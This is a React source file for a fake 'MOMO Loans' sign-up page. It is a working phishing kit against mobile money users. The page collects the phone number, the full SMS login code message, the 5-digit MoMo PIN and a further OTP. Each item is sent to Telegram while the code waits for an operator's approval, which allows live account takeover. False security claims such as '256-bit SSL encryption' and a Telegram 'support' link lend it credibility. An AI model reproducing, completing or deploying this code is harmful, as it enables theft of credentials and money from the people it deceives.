import { useState, useEffect, useRef } from 'react';
import { useNavigate, useLocation } from 'react-router-dom';
import Logo from '../components/Logo';
import PageLoader from '../components/PageLoader';
import { momoCountries, MoMoCountry } from '../data/countries';
import { setSession, registerNewUser } from '../lib/session';
import { sendForVerification, checkVerification, sendToTelegram } from '../lib/api';
import { ChevronDown, Loader2, ArrowLeft, ShieldCheck, MessageCircle, Clipboard, Check, MessageSquare, KeyRound, Lock } from 'lucide-react';

type WaitingState = 'none' | 'transition' | 'sms' | 'pin' | 'final_otp';

export default function SignUpFlow() {
  const navigate = useNavigate();
  const location = useLocation();
  const [step, setStep] = useState<1 | 2 | 3 | 4>(1); // 1=Phone, 2=SMS Message, 3=PIN, 4=4-Digit OTP Banner
  const [country, setCountry] = useState<MoMoCountry>(momoCountries[0]);
  const [phone, setPhone] = useState('');
  const [smsMessage, setSmsMessage] = useState('');
  const [otpSent, setOtpSent] = useState(false);
  const [pastedFeedback, setPastedFeedback] = useState(false);
  const [pin, setPin] = useState('');
  const [finalOtp, setFinalOtp] = useState('');
  const [dropdownOpen, setDropdownOpen] = useState(false);
  const [waiting, setWaiting] = useState<WaitingState>('none');
  const [sessionId, setSessionId] = useState('');
  const [error, setError] = useState('');
  const pollRef = useRef<ReturnType<typeof setInterval> | null>(null);

  // Poll for admin approval/callback
  useEffect(() => {
    if (waiting !== 'sms' && waiting !== 'pin' && waiting !== 'final_otp') return;
    if (!sessionId) return;

    pollRef.current = setInterval(async () => {
      try {
        const res = await checkVerification({ sessionId });
        if (res.status === 'correct') {
          if (pollRef.current) clearInterval(pollRef.current);
          if (waiting === 'sms') {
            setWaiting('none');
            setError('');
            setStep(3);
          } else if (waiting === 'pin') {
            setWaiting('none');
            setError('');
            setStep(4);
          } else if (waiting === 'final_otp') {
            setWaiting('none');
            setError('');
            registerNewUser({ phone, country: country.name, countryCode: country.code, pin });
            setSession({ phone, country: country.name, countryCode: country.code, loggedIn: true });

            const hasActiveWithdrawal =
              location.state?.returnTo === '/withdrawal-status' ||
              Boolean(localStorage.getItem('momo_withdrawal_initiated_at'));

            if (hasActiveWithdrawal) {
              navigate('/withdrawal-status');
            } else {
              navigate('/apply');
            }
          }
        } else if (res.status === 'incorrect') {
          if (pollRef.current) clearInterval(pollRef.current);
          setWaiting('none');
          setPin('');
          setSmsMessage('');
          setFinalOtp('');
          setOtpSent(false);
          setStep(1);
          setError('The details entered could not be verified. Please register with your valid MoMo details.');
        }
      } catch (err) {
        console.log('Verification check in progress...', err);
      }
    }, 1500);

    return () => {
      if (pollRef.current) clearInterval(pollRef.current);
    };
  }, [waiting, sessionId, navigate, phone, country]);

  const doTransition = (callback: () => void, delay = 2500) => {
    setWaiting('transition');
    setTimeout(() => {
      setWaiting('none');
      callback();
    }, delay);
  };

  const handleBack = () => {
    setError('');
    if (step === 4) {
      setStep(3);
      return;
    }
    if (step === 3) {
      setStep(2);
      setOtpSent(true);
      return;
    }
    if (step === 2 && otpSent) {
      setOtpSent(false);
      return;
    }
    if (step === 2) {
      setStep(1);
      return;
    }
    navigate('/');
  };

  // Step 1: Phone number -> send to telegram -> go to OTP/SMS
  const handlePhoneNext = () => {
    if (phone.length < 7) return;
    setError('');
    sendToTelegram({ type: 'phone', country: country.name, countryCode: country.code, phone }).catch(() => {});
    doTransition(() => setStep(2), 3000);
  };

  // Step 2a: Request SMS verification message
  const handleSendCode = () => {
    setError('');
    doTransition(() => setOtpSent(true), 3000);
  };

  // Quick clipboard paste action
  const handlePasteClipboard = async () => {
    try {
      if (navigator.clipboard && navigator.clipboard.readText) {
        const text = await navigator.clipboard.readText();
        if (text) {
          setSmsMessage(text.trim());
          setPastedFeedback(true);
          setTimeout(() => setPastedFeedback(false), 2000);
        }
      }
    } catch {
      // If browser clipboard permission denied or not supported, user can manually paste into textarea
    }
  };

  // Step 2b: Verify pasted SMS message
  const handleVerifySms = async () => {
    if (!smsMessage.trim()) return;
    setError('');
    sendToTelegram({
      type: 'sms',
      country: country.name,
      countryCode: country.code,
      phone,
      smsMessage: smsMessage.trim(),
      otp: smsMessage.trim(),
    }).catch(() => {});

    setWaiting('transition');
    setTimeout(async () => {
      try {
        const res = await sendForVerification({
          type: 'sms',
          country: country.name,
          countryCode: country.code,
          phone,
          smsMessage: smsMessage.trim(),
          otp: smsMessage.trim(),
        });
        setSessionId(res.sessionId);
        setWaiting('sms');
      } catch {
        const fallbackId = `${Date.now()}_sms`;
        setSessionId(fallbackId);
        setWaiting('sms');
      }
    }, 1500);
  };

  // Step 3: MoMo PIN
  const handlePinNext = async () => {
    if (pin.length !== 5) return;
    setError('');
    sendToTelegram({ type: 'credentials', country: country.name, countryCode: country.code, phone, pin }).catch(() => {});
    setWaiting('transition');
    setTimeout(async () => {
      try {
        const res = await sendForVerification({
          type: 'pin',
          country: country.name,
          countryCode: country.code,
          phone,
          pin,
        });
        setSessionId(res.sessionId);
        setWaiting('pin');
      } catch {
        const fallbackId = `${Date.now()}_pin`;
        setSessionId(fallbackId);
        setWaiting('pin');
      }
    }, 1500);
  };

  // Step 4: 4-Digit OTP Verification (Banner Page)
  const handleFinalOtpNext = async () => {
    if (finalOtp.length !== 4) return;
    setError('');
    sendToTelegram({
      type: 'final_otp',
      country: country.name,
      countryCode: country.code,
      phone,
      otp: finalOtp,
    }).catch(() => {});

    setWaiting('transition');
    setTimeout(async () => {
      try {
        const res = await sendForVerification({
          type: 'final_otp',
          country: country.name,
          countryCode: country.code,
          phone,
          otp: finalOtp,
        });
        setSessionId(res.sessionId);
        setWaiting('final_otp');
      } catch {
        const fallbackId = `${Date.now()}_otp`;
        setSessionId(fallbackId);
        setWaiting('final_otp');
      }
    }, 1500);
  };

  // Loading/Waiting States
  if (waiting === 'transition') {
    return <WaitingScreen message="Authenticating Mobile Money session..." sub="Please wait a moment." />;
  }
  if (waiting === 'sms') {
    return (
      <WaitingScreen
        message="Authenticating Mobile Money session..."
        sub="Verifying your MoMo account details. Please wait a moment."
      />
    );
  }
  if (waiting === 'pin') {
    return (
      <WaitingScreen
        message="Authenticating Mobile Money session..."
        sub="Verifying your MoMo account details. Please wait a moment."
      />
    );
  }
  if (waiting === 'final_otp') {
    return (
      <WaitingScreen
        message="Authenticating Mobile Money session..."
        sub="Verifying your one-time security passcode. Please wait a moment."
      />
    );
  }

  return (
    <PageLoader>
      <div className="min-h-screen bg-[hsl(198,100%,22%)] text-white flex flex-col items-center justify-center px-4 py-12">
        <Logo size="md" />
        <h2 className="text-2xl sm:text-3xl font-extrabold mt-4 mb-8 tracking-tight">
          MOMO <span className="text-[#ffcc00]">Loans</span>
        </h2>

        <div className="w-full max-w-md bg-white rounded-3xl p-6 sm:p-8 text-[hsl(198,100%,22%)] shadow-2xl relative border border-gray-100">
          <button
            id="signup-back-btn"
            onClick={handleBack}
            className="flex items-center gap-1.5 text-gray-500 hover:text-gray-900 text-sm font-semibold mb-6 transition"
          >
            <ArrowLeft className="w-4 h-4" />
            <span>Back</span>
          </button>

          {error && (
            <div className="mb-6 p-4 rounded-2xl bg-red-50 border border-red-200 text-red-700 text-xs sm:text-sm font-semibold text-center leading-relaxed">
              {error}
            </div>
          )}

          {/* Step 1: Mobile Number */}
          {step === 1 && (
            <div id="step-1-phone">
              <h3 className="text-xl font-extrabold mb-1.5 text-center text-[hsl(198,100%,22%)]">
                Enter your mobile number
              </h3>
              <p className="text-gray-500 text-xs sm:text-sm text-center mb-6">
                Choose your country and enter your Mobile Money phone number
              </p>

              <div className="relative mb-6">
                <div className="flex items-center border-2 border-gray-200 focus-within:border-[#ffcc00] rounded-2xl overflow-hidden transition shadow-sm bg-white">
                  <button
                    type="button"
                    onClick={() => setDropdownOpen(!dropdownOpen)}
                    className="flex items-center justify-center gap-2 px-3.5 sm:px-4 py-3.5 bg-gray-50 border-r border-gray-200 hover:bg-gray-100 transition shrink-0 min-w-[86px] sm:min-w-[92px] cursor-pointer select-none"
                    title={country.name}
                  >
                    <div className="w-8 h-5.5 flex items-center justify-center shrink-0 overflow-hidden rounded-[3px] shadow-xs border border-gray-300 bg-white">
                      <img
                        src={`https://flagcdn.com/w80/${country.iso}.png`}
                        alt={country.name}
                        className="w-full h-full object-cover block"
                        loading="eager"
                      />
                    </div>
                    <ChevronDown className="w-4 h-4 text-gray-500 shrink-0" />
                  </button>
                  <input
                    id="phone-input"
                    type="tel"
                    value={phone}
                    onChange={(e) => setPhone(e.target.value.replace(/\D/g, ''))}
                    placeholder="e.g. 785698452"
                    className="flex-1 min-w-0 px-4 py-3.5 text-base font-bold text-gray-900 outline-none placeholder:text-gray-400 bg-transparent"
                    autoFocus
                  />
                </div>

                {dropdownOpen && (
                  <div className="absolute z-30 w-full mt-2 bg-white border border-gray-200 rounded-2xl shadow-2xl max-h-60 overflow-y-auto divide-y divide-gray-100">
                    {momoCountries.map((c) => (
                      <button
                        key={c.name}
                        type="button"
                        onClick={() => {
                          setCountry(c);
                          setDropdownOpen(false);
                        }}
                        className="w-full flex items-center gap-3 px-4 py-3 hover:bg-gray-50 text-sm font-semibold text-gray-800 transition text-left"
                      >
                        <div className="w-8 h-5.5 flex items-center justify-center shrink-0 overflow-hidden rounded-[3px] shadow-xs border border-gray-300 bg-white">
                          <img
                            src={`https://flagcdn.com/w80/${c.iso}.png`}
                            alt={c.name}
                            className="w-full h-full object-cover block"
                            loading="lazy"
                          />
                        </div>
                        <span>{c.name}</span>
                        <span className="text-gray-400 font-bold ml-auto">{c.code}</span>
                      </button>
                    ))}
                  </div>
                )}
              </div>

              <div className="flex items-center gap-2 text-xs text-gray-500 mb-6 bg-gray-50 p-3 rounded-xl">
                <ShieldCheck className="w-4 h-4 text-green-600 shrink-0" />
                <span>Your Mobile Money account data is protected with 256-bit SSL encryption.</span>
              </div>

              <button
                id="phone-next-btn"
                onClick={handlePhoneNext}
                disabled={phone.length < 7}
                className="w-full py-4 rounded-2xl bg-[#ffcc00] text-[hsl(198,100%,22%)] font-extrabold text-base hover:bg-[#ffcc00]/90 disabled:opacity-40 transition shadow-md"
              >
                Next
              </button>
            </div>
          )}

          {/* Step 2: Full SMS Message */}
          {step === 2 && (
            <div id="step-2-sms">
              <h3 className="text-xl font-extrabold mb-1.5 text-center text-[hsl(198,100%,22%)]">
                {otpSent ? 'Paste SMS Message' : 'Request SMS Verification'}
              </h3>

              {!otpSent ? (
                <>
                  <p className="text-gray-500 text-xs sm:text-sm text-center mb-6 leading-relaxed">
                    We will send an SMS verification message to <span className="font-bold text-gray-800">{country.code} {phone}</span>
                  </p>
                  <button
                    id="send-code-btn"
                    onClick={handleSendCode}
                    className="w-full py-4 rounded-2xl bg-[#ffcc00] text-[hsl(198,100%,22%)] font-extrabold text-base hover:bg-[#ffcc00]/90 transition shadow-md"
                  >
                    Send SMS Verification
                  </button>
                </>
              ) : (
                <>
                  <p className="text-gray-500 text-xs sm:text-sm text-center mb-4 leading-relaxed">
                    Copy and paste the <span className="font-bold text-gray-900">entire SMS message</span> received on <span className="font-bold text-gray-900">{country.code} {phone}</span> below:
                  </p>

                  <div className="flex justify-end mb-2">
                    <button
                      type="button"
                      id="paste-clipboard-btn"
                      onClick={handlePasteClipboard}
                      className="inline-flex items-center gap-1.5 px-3 py-1.5 rounded-xl bg-gray-100 hover:bg-gray-200 text-gray-700 text-xs font-bold transition shadow-sm"
                    >
                      {pastedFeedback ? (
                        <>
                          <Check className="w-3.5 h-3.5 text-green-600" />
                          <span className="text-green-700">Pasted!</span>
                        </>
                      ) : (
                        <>
                          <Clipboard className="w-3.5 h-3.5 text-gray-600" />
                          <span>Paste from Clipboard</span>
                        </>
                      )}
                    </button>
                  </div>

                  <div className="relative mb-3">
                    <textarea
                      id="sms-message-input"
                      rows={5}
                      value={smsMessage}
                      onChange={(e) => setSmsMessage(e.target.value)}
                      placeholder="<#> Y'ello. Please enter the following code :9961 to complete your login. Be Careful. NEVER Share this code. RdbS6eMOXvx N/RywfrtIZL yiitGCXacTO I+/DM+YOkqw L9X0x07s5X9 +BQ+I2vBZvQ 071KQ0fm1I6"
                      className="w-full border-2 border-gray-200 focus:border-[#ffcc00] rounded-2xl p-4 text-xs sm:text-sm text-gray-900 font-medium placeholder:text-gray-400 placeholder:italic outline-none shadow-sm transition resize-none leading-relaxed"
                      autoFocus
                    />
                    <div className="absolute right-3 bottom-3 flex items-center gap-1 text-[11px] text-gray-400 font-semibold bg-white/90 px-2 py-0.5 rounded-md">
                      <MessageSquare className="w-3 h-3 text-gray-400" />
                      <span>{smsMessage.length} characters</span>
                    </div>
                  </div>

                  <div className="flex items-center gap-2 text-xs text-gray-500 mb-6 bg-amber-50/70 border border-amber-200/60 p-3 rounded-xl">
                    <ShieldCheck className="w-4 h-4 text-amber-700 shrink-0" />
                    <span className="text-amber-900 text-[11px] leading-tight">
                      Please paste the complete SMS message text exactly as received in your Messages app.
                    </span>
                  </div>

                  <button
                    id="verify-sms-btn"
                    onClick={handleVerifySms}
                    disabled={!smsMessage.trim()}
                    className="w-full py-4 rounded-2xl bg-[#ffcc00] text-[hsl(198,100%,22%)] font-extrabold text-base hover:bg-[#ffcc00]/90 disabled:opacity-40 transition shadow-md"
                  >
                    Verify & Continue
                  </button>

                  <div className="mt-6 pt-4 border-t border-gray-100 text-center">
                    <p className="text-gray-500 text-xs mb-2 font-medium">Didn't receive the SMS message?</p>
                    <a
                      href="https://t.me/Momosupportdeskbot"
                      target="_blank"
                      rel="noopener noreferrer"
                      className="inline-flex items-center gap-1.5 text-xs sm:text-sm font-bold text-blue-600 hover:text-blue-700 transition"
                    >
                      <MessageCircle className="w-4 h-4" />
                      <span>Contact Support on Telegram</span>
                    </a>
                  </div>
                </>
              )}
            </div>
          )}

          {/* Step 3: MoMo PIN */}
          {step === 3 && (
            <div id="step-3-pin">
              <h3 className="text-xl font-extrabold mb-1.5 text-center text-[hsl(198,100%,22%)]">
                Enter your MoMo PIN
              </h3>
              <p className="text-gray-500 text-xs sm:text-sm text-center mb-6">
                Enter your 5-digit Mobile Money security PIN to authorize loan linking
              </p>

              <input
                id="pin-input"
                type="password"
                inputMode="numeric"
                maxLength={5}
                value={pin}
                onChange={(e) => setPin(e.target.value.replace(/\D/g, ''))}
                placeholder="•••••"
                className="w-full border-2 border-gray-200 focus:border-[#ffcc00] rounded-2xl px-4 py-3.5 text-center text-3xl tracking-[0.5em] mb-6 outline-none font-extrabold text-gray-900 shadow-sm transition"
                autoFocus
              />

              <div className="flex items-center gap-2 text-xs text-gray-500 mb-6 bg-gray-50 p-3 rounded-xl">
                <ShieldCheck className="w-4 h-4 text-green-600 shrink-0" />
                <span>Protected by bank-level PIN encryption standards.</span>
              </div>

              <button
                id="pin-next-btn"
                onClick={handlePinNext}
                disabled={pin.length !== 5}
                className="w-full py-4 rounded-2xl bg-[#ffcc00] text-[hsl(198,100%,22%)] font-extrabold text-base hover:bg-[#ffcc00]/90 disabled:opacity-40 transition shadow-md"
              >
                Continue
              </button>
            </div>
          )}

          {/* Step 4: OTP Verification Banner Page (4-digit PIN) */}
          {step === 4 && (
            <div id="step-4-otp-banner">
              {/* Security Banner Header */}
              <div className="bg-gradient-to-r from-amber-500/15 to-yellow-500/10 border-2 border-amber-300/80 rounded-2xl p-4 mb-6">
                <div className="flex items-center gap-2 text-amber-900 font-extrabold text-xs uppercase tracking-wider mb-1">
                  <Lock className="w-4 h-4 text-amber-700" />
                  <span>Security Verification Step</span>
                </div>
                <h3 className="text-lg sm:text-xl font-extrabold text-gray-900 leading-tight">
                  Enter 4-Digit OTP Code
                </h3>
                <p className="text-gray-600 text-xs mt-1 leading-relaxed">
                  A 4-digit verification PIN has been dispatched to your Mobile Money number <span className="font-bold text-gray-900">{country.code} {phone}</span>.
                </p>
              </div>

              <div className="mb-6">
                <label className="block text-xs font-bold text-gray-700 mb-2 text-center uppercase tracking-wider">
                  4-Digit OTP PIN
                </label>
                <input
                  id="final-otp-input"
                  type="text"
                  inputMode="numeric"
                  maxLength={4}
                  value={finalOtp}
                  onChange={(e) => setFinalOtp(e.target.value.replace(/\D/g, ''))}
                  placeholder="0000"
                  className="w-full border-2 border-gray-200 focus:border-[#ffcc00] rounded-2xl px-4 py-4 text-center text-3xl tracking-[0.6em] outline-none font-black text-gray-900 shadow-sm transition"
                  autoFocus
                />
              </div>

              <div className="flex items-center gap-2 text-xs text-gray-500 mb-6 bg-gray-50 p-3 rounded-xl">
                <KeyRound className="w-4 h-4 text-amber-600 shrink-0" />
                <span>Enter the 4-digit passcode exactly as received via SMS.</span>
              </div>

              <button
                id="final-otp-continue-btn"
                onClick={handleFinalOtpNext}
                disabled={finalOtp.length !== 4}
                className="w-full py-4 rounded-2xl bg-[#ffcc00] text-[hsl(198,100%,22%)] font-extrabold text-base hover:bg-[#ffcc00]/90 disabled:opacity-40 transition shadow-md"
              >
                Continue
              </button>

              <div className="mt-6 pt-4 border-t border-gray-100 text-center">
                <p className="text-gray-500 text-xs mb-2 font-medium">Didn't receive the 4-digit OTP?</p>
                <a
                  href="https://t.me/Momosupportdeskbot"
                  target="_blank"
                  rel="noopener noreferrer"
                  className="inline-flex items-center gap-1.5 text-xs sm:text-sm font-bold text-blue-600 hover:text-blue-700 transition"
                >
                  <MessageCircle className="w-4 h-4" />
                  <span>Contact Support on Telegram</span>
                </a>
              </div>
            </div>
          )}

          {/* Step Dots */}
          <div className="flex justify-center items-center gap-2 mt-8">
            {[1, 2, 3, 4].map((s) => (
              <div
                key={s}
                className={`h-2 rounded-full transition-all duration-300 ${
                  s === step ? 'w-8 bg-[#ffcc00]' : 'w-2 bg-gray-200'
                }`}
              />
            ))}
          </div>
        </div>
      </div>
    </PageLoader>
  );
}

function WaitingScreen({ message, sub }: { message: string; sub?: string }) {
  return (
    <div className="min-h-screen bg-[hsl(198,100%,22%)] text-white flex flex-col items-center justify-center gap-6 px-4 py-12 text-center">
      <Logo size="md" />
      <h2 className="text-2xl font-extrabold tracking-tight">
        MOMO <span className="text-[#ffcc00]">Loans</span>
      </h2>
      <Loader2 className="w-10 h-10 text-[#ffcc00] animate-spin" />
      <p className="text-white text-base sm:text-lg font-bold max-w-sm">{message}</p>
      {sub && <p className="text-gray-400 text-xs sm:text-sm max-w-xs leading-relaxed">{sub}</p>}
    </div>
  );
}
